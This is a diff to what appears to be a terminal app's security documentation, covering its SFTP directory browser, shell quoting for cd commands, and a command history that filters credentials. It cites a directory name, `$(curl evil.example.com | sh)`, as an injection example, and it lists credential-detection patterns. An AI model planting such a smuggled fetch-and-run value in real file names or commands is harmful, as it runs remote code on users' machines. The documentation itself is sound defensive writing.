@@ -81,6 +81,55 @@ the narrowest part of the application worth stating plainly:
   fingerprint, is put to the user. Passwords and passphrases are written to the
   client and are not stored, logged, or returned to the renderer.
 
+## What a pane's directory browser connects to
+
+Opening the browser in an SSH pane opens an SFTP connection to that pane's host
+if one is not already open — the browser is a second consumer of the transfer
+connections described above, and everything stated there applies unchanged:
+authentication is delegated to the system `sftp` client, so `~/.ssh/config`, the
+agent and `known_hosts` verification all apply, and ZeroG never answers a
+host-key or password prompt itself.
+
+Two consequences worth stating plainly:
+
+- The browser can start an outbound connection to a host the user has a terminal
+  open to. It is never automatic: a browser opens because the folder button was
+  clicked, and it is remembered per pane, so reopening a workspace whose pane had
+  one open will reconnect to that host.
+- A pending question is *shown* in the browser and answered only in the transfer
+  panel, which is the surface with the fingerprint next to it. The browser has no
+  answer field, so there is no second place a passphrase can be typed.
+
+## Changing directory from the browser
+
+Double-clicking a folder in a pane's directory browser makes ZeroG type a command
+into that pane. Everywhere else in this application a path is passed as an
+element of an argument vector, where quoting cannot matter; here the path becomes
+part of a shell line, and the directory names come from the far side of an SSH
+connection or from a filesystem someone else may be able to write to. A directory
+named `$(curl evil.example.com | sh)` is a plausible thing to find in a listing.
+
+So the quoting is the whole defence, it lives in one place
+(`src/renderer/pane-directory.ts`), and it is exercised against a real `sh` in
+`tests/pane-directory-shell.test.ts` — a test that creates directories whose
+names contain commands and asserts that after cd'ing into every one of them,
+none of those commands ran.
+
+- POSIX shells: single quotes, with an embedded quote closed and reopened. No
+  expansion of any kind survives single quotes.
+- PowerShell: `Set-Location -LiteralPath` with single quotes doubled.
+  `-LiteralPath` rather than `-Path` because a directory named `[1]` is a
+  wildcard to `Set-Location`, which would fail to find a directory that exists.
+- Command Prompt: `cd /d` with double quotes, and a name containing a double
+  quote is refused — `cmd` has no escape for it that is correct in general.
+- A name containing a carriage return or newline is refused for every shell. It
+  would submit the line early, which is a second command by definition.
+- Where the shell family cannot be determined, nothing is typed.
+
+A WSL pane's path is translated across the `\\wsl.localhost\` share boundary
+before it is quoted, and a path that does not belong to that pane's own
+distribution is refused rather than translated approximately.
+
 ## Network egress from the renderer
 
 The renderer's Content-Security-Policy limits `connect-src` to:
@@ -142,3 +191,45 @@ localStorage — a plain file. So the key is not kept there:
   break the ordinary case, but the field says plainly when it applies.
 
 These controls are not a guarantee of security. Please report bypasses or regressions privately.
+
+## The command history
+
+The command history palette is the only part of ZeroG that stores what the user
+typed. Everything else deliberately does not: `session-history.json` records
+lifecycle events and states that it "never stores cwd, args, or credentials", and
+`workspaces.json` and `port-forwards.json` hold only metadata. A command history
+cannot make that promise, because the command text is the whole point — so the
+question is answered here instead.
+
+- **Off until asked for.** Recording is a setting, off by default. With it off,
+  nothing about what is typed is written anywhere and `command-history.json` does
+  not exist. The palette says so rather than appearing empty.
+- **Only what a shell volunteers.** Commands come from the standard OSC 133
+  prompt marks. A pane whose shell emits none records nothing at all; ZeroG does
+  not reconstruct the input line from the screen, because a history that is
+  sometimes wrong is worse than a smaller one that is not. This is the same
+  bargain the working-directory tracking already makes for OSC 7.
+- **What is kept.** The command, the directory and host it ran in, its exit
+  status, when it last ran, how many times, and how often it was chosen from the
+  palette. Written to `command-history.json` in the app's data directory, 0600,
+  replaced atomically, capped at 5000 entries. Clearing removes the file rather
+  than leaving an empty one.
+- **What is refused.** A command matching a credential shape is dropped whole,
+  never stored with the value masked: a masked entry still records that a
+  particular secret was set in a particular directory at a particular time, and
+  invites a false sense that what remains is safe. The rules cover assignments to
+  anything named like a token, key, secret, password, passphrase or credential;
+  `--password`/`--token`/`--api-key`-style flags and `mysql -p<value>`;
+  credentials embedded in a URL; `Authorization` and `X-Api-Key` headers;
+  `curl -u user:pass`; `openssl -passin`; vendor-shaped tokens for GitHub,
+  GitLab, Slack, AWS, Google, npm and OpenAI-compatible keys, and JWTs; and long
+  mixed-case high-entropy words.
+- **The rules err towards refusing.** `SSH_AUTH_SOCK=/tmp/x` is not a secret and
+  is refused anyway, because it matches the shape. Losing a harmless entry is
+  invisible; storing a token is not.
+- **What it does not catch, and does not claim to.** A secret passed as a bare
+  argument to a program the rules do not know about, piped in from `echo`, or
+  read from a file whose path is the only thing on the line, looks exactly like
+  ordinary text. Anyone treating this as a guarantee that no credential can ever
+  reach the file would be wrong. The mitigation is that the feature is off by
+  default, the file is local and owner-only, and it can be cleared in one click.
